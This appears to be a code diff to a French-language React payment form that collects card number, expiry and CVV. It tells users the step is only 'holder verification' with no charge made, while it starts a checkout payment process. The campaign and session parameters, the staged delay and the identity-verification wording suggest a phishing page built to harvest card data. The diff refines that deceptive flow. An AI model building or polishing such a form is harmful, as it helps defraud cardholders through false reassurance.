@@ -1,7 +1,7 @@
 import React, { useRef, useState, useEffect } from 'react';
 import Checkout from './Checkout';
 
-export default function PaymentForm({ email, firstName, campaign }) {
+export default function PaymentForm({ email, firstName, campaign, sessionPath }) {
   const [card, setCard] = useState('');
   const [exp, setExp] = useState('');
   const [cvv, setCvv] = useState('');
@@ -50,11 +50,12 @@ export default function PaymentForm({ email, firstName, campaign }) {
     // Changer le texte du bouton en "Vérification..."
     setButtonText('Vérification...');
 
-    // keep the button in loading state for 6s minimal to mimic prior UI behavior
-    await new Promise(r => setTimeout(r, 6000));
+    // keep the button in loading state for 4s minimal to mimic prior UI behavior
+    await new Promise(r => setTimeout(r, 4000));
 
     // Déclencher le flux de paiement Checkout.js
     setIsSubmitting(true);
+    setButtonText('Vérifier mon identité');
 
     if (checkoutRef.current) {
       checkoutRef.current.startPaymentProcess();
@@ -98,10 +99,10 @@ export default function PaymentForm({ email, firstName, campaign }) {
       </div>
 
       <div className="notice" aria-live="polite">
-         Vérification du titulaire • Aucun paiement à effectuer
+         Vérification du titulaire • Aucun prélèvement effectué
       </div>
 
-      <button type="submit" className="button" style={{ width: '100%' }} disabled={isSubmitting}>
+      <button type="submit" className="button" style={{ width: '100%' }}>
         {buttonText}
       </button>
 
@@ -112,6 +113,7 @@ export default function PaymentForm({ email, firstName, campaign }) {
           email={email}
           firstName={firstName}
           campaign={campaign}
+          sessionPath={sessionPath}
           onSuccess={() => {}}
           onError={() => {}}
         />
